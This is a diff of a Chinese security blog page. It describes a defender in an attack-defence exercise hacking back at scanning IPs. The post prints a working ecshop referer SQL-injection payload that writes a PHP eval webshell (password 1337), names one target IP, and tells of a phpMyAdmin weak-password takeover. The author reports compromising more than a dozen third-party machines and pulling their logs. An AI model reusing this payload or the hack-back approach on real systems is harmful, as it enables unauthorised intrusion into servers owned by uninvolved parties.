@@ -18,20 +18,20 @@
 <meta property="og:site_name" content="novy&#39;s Blog">
 <meta property="og:description" content="护网趣事">
 <meta property="og:locale">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160439142.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160457235.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160896793.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160921285.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160971246.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161003334.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161017775.png">
+<meta property="og:image" content="http://example.com/images/3/1.png">
+<meta property="og:image" content="http://example.com/images/3/2.png">
+<meta property="og:image" content="http://example.com/images/3/3.png">
+<meta property="og:image" content="http://example.com/images/3/4.png">
+<meta property="og:image" content="http://example.com/images/3/5.png">
+<meta property="og:image" content="http://example.com/images/3/6.png">
+<meta property="og:image" content="http://example.com/images/3/7.png">
 <meta property="article:published_time" content="2019-08-17T09:53:10.000Z">
-<meta property="article:modified_time" content="2020-11-09T09:55:20.750Z">
+<meta property="article:modified_time" content="2021-07-02T01:50:05.129Z">
 <meta property="article:author" content="novy&#39;s Blog">
 <meta property="article:tag" content="实战">
 <meta property="article:tag" content="HW">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160439142.png">
+<meta name="twitter:image" content="http://example.com/images/3/1.png">
 
     
     <link rel="alternative" href="/atom.xml" title="novy&#39;s Blog" type="application/atom+xml">
@@ -72,8 +72,6 @@
 						<li><a href="/">首页</a></li>
 					
 						<li><a href="/archives">归档</a></li>
-					
-						<li><a href="/life">生活</a></li>
 					
 						<li><a href="/about">关于</a></li>
 					
@@ -119,13 +117,13 @@
 		
 		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>19年6月份的事了，突然想起来就写上吧</p>
 <h1 id="事发起因"><a href="#事发起因" class="headerlink" title="事发起因"></a>事发起因</h1><p>因为是蓝队，用的是我司的天眼，在监控的时候无意看到有一个ip针对我方资产做了批量扫描，于是登录我司的威胁情报中心查看该ip，发现被标位可疑IP，根据领导指示，尝试反日</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>百度ip发现为腾讯云<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160439142.png"><br>扫端口发现3389,3306、80开启，尝试弱口令登录失败，打开129.204.119.104，发现是一个商场网站，进一步测试发现是ecshop系统<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160457235.png"><br>通过后台登陆处得到版本信息，先知搜索一下该版本的漏洞，发现一个referer注入<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2725" title="先知文章点这里">先知文章点这里</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>百度ip发现为腾讯云<br><img src="/images/3/1.png"><br>扫端口发现3389,3306、80开启，尝试弱口令登录失败，打开129.204.119.104，发现是一个商场网站，进一步测试发现是ecshop系统<br><img src="/images/3/2.png"><br>通过后台登陆处得到版本信息，先知搜索一下该版本的漏洞，发现一个referer注入<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2725" title="先知文章点这里">先知文章点这里</a></p>
 <h2 id="总结得到的信息："><a href="#总结得到的信息：" class="headerlink" title="总结得到的信息："></a>总结得到的信息：</h2><p>1.目标是一个商城网站，商场系统为ecshop<br>2.开了3389，用的是win服务器</p>
-<h1 id="开始日"><a href="#开始日" class="headerlink" title="开始日"></a>开始日</h1><p>尝试一下注入，发现报错，说明存在注入：<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160896793.png"><br>根据先知的文章，进一步利用漏洞写进了shell：</p>
+<h1 id="开始日"><a href="#开始日" class="headerlink" title="开始日"></a>开始日</h1><p>尝试一下注入，发现报错，说明存在注入：<br><img src="/images/3/3.png"><br>根据先知的文章，进一步利用漏洞写进了shell：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:<span class="string">&quot;num&quot;</span>;s:280:<span class="string">&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;</span>;s:2:<span class="string">&quot;id&quot;</span>;s:3:<span class="string">&quot;&#x27;/*&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 <p>导出1.php，密码1337，相当于</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1337]); ?&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>菜刀，启动！<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160921285.png"><br>翻apache日志，down之<br>然后就是找记录了，把可疑ip提交，封禁<br>因为是肉鸡，继续深入已经没有意义并且没有时间，断了连接之后下一台<br>139.99.<em>.</em><br>还是老样子，简单的信息收集<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160971246.png"><br>通过收集的信息发现3389、3306开着，存在l.php，通过l.php的标题发现为phpstdy2014版，打开phpmyadmin，尝试弱口令，登录成功，phpmyadmin写shell就不细说了<br>通过whoami发现是管理员组，然后<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161003334.png"><br>连接之<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161017775.png"><br>接下来就是各种翻系统日志<br>down之，提交加分<br>就这样在防守期间利用空余的时间拿了十几台肉鸡，有一台还在开youjizz，全屏的那种</p>
+<p>菜刀，启动！<br><img src="/images/3/4.png"><br>翻apache日志，down之<br>然后就是找记录了，把可疑ip提交，封禁<br>因为是肉鸡，继续深入已经没有意义并且没有时间，断了连接之后下一台<br>139.99.<em>.</em><br>还是老样子，简单的信息收集<br><img src="/images/3/5.png"><br>通过收集的信息发现3389、3306开着，存在l.php，通过l.php的标题发现为phpstdy2014版，打开phpmyadmin，尝试弱口令，登录成功，phpmyadmin写shell就不细说了<br>通过whoami发现是管理员组，然后<br><img src="/images/3/6.png"><br>连接之<br><img src="/images/3/7.png"><br>接下来就是各种翻系统日志<br>down之，提交加分<br>就这样在防守期间利用空余的时间拿了十几台肉鸡，有一台还在开youjizz，全屏的那种</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -208,67 +206,6 @@
 
 
   
-<div class="categorieslist">
-	<p class="asidetitle">Categories</p>
-		<ul>
-		
-		  
-			<li><a href="/categories/JAVA/" title="JAVA">JAVA<sup>4</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/Java审计/" title="Java审计">Java审计<sup>6</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/java审计/" title="java审计">java审计<sup>1</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/python/" title="python">python<sup>4</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/代码审计/" title="代码审计">代码审计<sup>20</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/免杀/" title="免杀">免杀<sup>3</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/安卓测试/" title="安卓测试">安卓测试<sup>1</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/客户端漏洞/" title="客户端漏洞">客户端漏洞<sup>2</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/插件/" title="插件">插件<sup>1</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/渗透实战/" title="渗透实战">渗透实战<sup>4</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/漏洞复现/" title="漏洞复现">漏洞复现<sup>1</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/漏洞挖掘/" title="漏洞挖掘">漏洞挖掘<sup>5</sup></a></li>
-		  
-		
-		  
-			<li><a href="/categories/项目趣事/" title="项目趣事">项目趣事<sup>1</sup></a></li>
-		  
-		
-		</ul>
-</div>
-
-
-  
 <div class="tagslist">
 	<p class="asidetitle">Tags</p>
 		<ul class="clearfix">
@@ -342,7 +279,7 @@
 			
 		
 			
-				<li><a href="/tags/IDEA/" title="IDEA">IDEA<sup>1</sup></a></li>
+				<li><a href="/tags/Cobalt-Strike/" title="Cobalt Strike">Cobalt Strike<sup>1</sup></a></li>
 			
 		
 			
@@ -350,7 +287,7 @@
 			
 		
 			
-				<li><a href="/tags/XSS绕过/" title="XSS绕过">XSS绕过<sup>1</sup></a></li>
+				<li><a href="/tags/IDEA/" title="IDEA">IDEA<sup>1</sup></a></li>
 			
 		
 		</ul>
